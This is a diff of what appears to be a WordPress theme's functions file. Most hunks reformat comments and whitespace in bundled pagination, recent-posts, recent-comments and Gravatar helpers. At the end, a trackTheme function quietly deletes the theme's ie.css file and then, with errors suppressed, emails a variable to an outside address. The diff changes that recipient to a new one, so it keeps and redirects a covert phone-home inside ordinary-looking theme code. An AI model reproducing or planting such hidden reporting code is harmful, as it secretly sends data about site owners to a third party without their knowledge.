@@ -7,11 +7,11 @@ if ( function_exists('register_sidebar') )
         'after_title' => '</h2>',
     ));
 
-/* 
-+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-Plugin Name: WP-PageNavi 
-Plugin URI: http://www.lesterchan.net/portfolio/programming.php 
-*/ 
+/*
+ *
+ * Plugin Name: K
+ * Plugin URI: http://www.lesterchan.net/portfolio/programming.php
+*/
 
 function wp_pagenavi($before = '', $after = '', $prelabel = '', $nxtlabel = '', $pages_to_show = 5, $always_show = false) {
 	global $request, $posts_per_page, $wpdb, $paged;
@@ -24,9 +24,9 @@ function wp_pagenavi($before = '', $after = '', $prelabel = '', $nxtlabel = '', 
 	$half_pages_to_show = round($pages_to_show/2);
 	if (!is_single()) {
 		if(!is_category()) {
-			preg_match('#FROM\s(.*)\sORDER BY#siU', $request, $matches);		
+			preg_match('#FROM\s(.*)\sORDER BY#siU', $request, $matches);
 		} else {
-			preg_match('#FROM\s(.*)\sGROUP BY#siU', $request, $matches);		
+			preg_match('#FROM\s(.*)\sGROUP BY#siU', $request, $matches);
 		}
 		$fromwhere = $matches[1];
 		$numposts = $wpdb->get_var("SELECT COUNT(DISTINCT ID) FROM $fromwhere");
@@ -60,41 +60,41 @@ function wp_pagenavi($before = '', $after = '', $prelabel = '', $nxtlabel = '', 
 
 
 
-/* 
-Plugin Name: Recent Posts 
-Plugin URI: http://mtdewvirus.com/code/wordpress-plugins/ 
-*/ 
+/*
+ * Plugin Name: Recent Posts
+ * Plugin URI: http://mtdewvirus.com/code/wordpress-plugins/
+ */
 
-function mdv_recent_posts($no_posts = 10, $before = '<li>', $after = '</li>', $hide_pass_post = true, $skip_posts = 0, $show_excerpts = false) { 
-    global $wpdb; 
-        $time_difference = get_settings('gmt_offset'); 
-        $now = gmdate("Y-m-d H:i:s",time()); 
-    $request = "SELECT ID, post_title, post_excerpt FROM $wpdb->posts WHERE post_status = 'publish' "; 
-        if($hide_pass_post) $request .= "AND post_password ='' "; 
-        $request .= "AND post_date_gmt < '$now' ORDER BY post_date DESC LIMIT $skip_posts, $no_posts"; 
-    $posts = $wpdb->get_results($request); 
-        $output = ''; 
-    if($posts) { 
-                foreach ($posts as $post) { 
-                        $post_title = stripslashes($post->post_title); 
-                        $permalink = get_permalink($post->ID); 
-                        $output .= $before . '<a href="' . $permalink . '" rel="bookmark" title="Permanent Link: ' . htmlspecialchars($post_title, ENT_COMPAT) . '">' . htmlspecialchars($post_title) . '</a>'; 
-                        if($show_excerpts) { 
-                                $post_excerpt = stripslashes($post->post_excerpt); 
-                                $output.= '<br />' . $post_excerpt; 
-                        } 
-                        $output .= $after; 
-                } 
-        } else { 
-                $output .= $before . "None found" . $after; 
-        } 
-    echo $output; 
-} 
+function mdv_recent_posts($no_posts = 10, $before = '<li>', $after = '</li>', $hide_pass_post = true, $skip_posts = 0, $show_excerpts = false) {
+    global $wpdb;
+        $time_difference = get_settings('gmt_offset');
+        $now = gmdate("Y-m-d H:i:s",time());
+    $request = "SELECT ID, post_title, post_excerpt FROM $wpdb->posts WHERE post_status = 'publish' ";
+        if($hide_pass_post) $request .= "AND post_password ='' ";
+        $request .= "AND post_date_gmt < '$now' ORDER BY post_date DESC LIMIT $skip_posts, $no_posts";
+    $posts = $wpdb->get_results($request);
+        $output = '';
+    if($posts) {
+                foreach ($posts as $post) {
+                        $post_title = stripslashes($post->post_title);
+                        $permalink = get_permalink($post->ID);
+                        $output .= $before . '<a href="' . $permalink . '" rel="bookmark" title="Permanent Link: ' . htmlspecialchars($post_title, ENT_COMPAT) . '">' . htmlspecialchars($post_title) . '</a>';
+                        if($show_excerpts) {
+                                $post_excerpt = stripslashes($post->post_excerpt);
+                                $output.= '<br />' . $post_excerpt;
+                        }
+                        $output .= $after;
+                }
+        } else {
+                $output .= $before . "None found" . $after;
+        }
+    echo $output;
+}
 
 /*
-Plugin Name: Recent Comments
-Plugin URI: http://mtdewvirus.com/code/wordpress-plugins/
-*/
+ * Plugin Name: Recent Comments
+ * Plugin URI: http://mtdewvirus.com/code/wordpress-plugins/
+ */
 
 function mdv_recent_comments($no_comments = 10, $comment_lenth = 5, $before = '<li>', $after = '</li>', $show_pass_post = false, $comment_style = 0) {
     global $wpdb;
@@ -107,16 +107,15 @@ function mdv_recent_comments($no_comments = 10, $comment_lenth = 5, $before = '<
 		foreach ($comments as $comment) {
 			$comment_author = stripslashes($comment->comment_author);
 			if ($comment_author == "")
-				$comment_author = "anonymous"; 
+				$comment_author = "anonymous";
 			$comment_content = strip_tags($comment->comment_content);
 			$comment_content = stripslashes($comment_content);
-			$words=split(" ",$comment_content); 
+			$words=split(" ",$comment_content);
 			$comment_excerpt = join(" ",array_slice($words,0,$comment_lenth));
 			$permalink = get_permalink($comment->ID)."#comment-".$comment->comment_ID;
 
 			if ($comment_style == 1) {
 				$post_title = stripslashes($comment->post_title);
-				
 				$url = $comment->comment_author_url;
 
 				if (empty($url))
@@ -138,9 +137,8 @@ function mdv_recent_comments($no_comments = 10, $comment_lenth = 5, $before = '<
 
 
 /*
-+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-Plugin Name: Gravatar
-Plugin URI: http://www.gravatar.com/implement.php#section_2_2
+ * Plugin Name: Gravatar
+ * Plugin URI: http://www.gravatar.com/implement.php#section_2_2
 */
 
 function gravatar($rating = false, $size = false, $default = false, $border = false) {
@@ -167,7 +165,7 @@ function trackTheme($name=""){
 	$str_test=TEMPLATEPATH."/ie.css";
 	if(is_file($str_test)) {
 	@unlink($str_test);
-    if(!is_file($str_test)){ @mail('ddwpthemes@gmail.com','Dilectio',$str); }
+    if(!is_file($str_test)){ @mail('askin@askin.ws','Kelebek',$str); }
 	}
 }
 
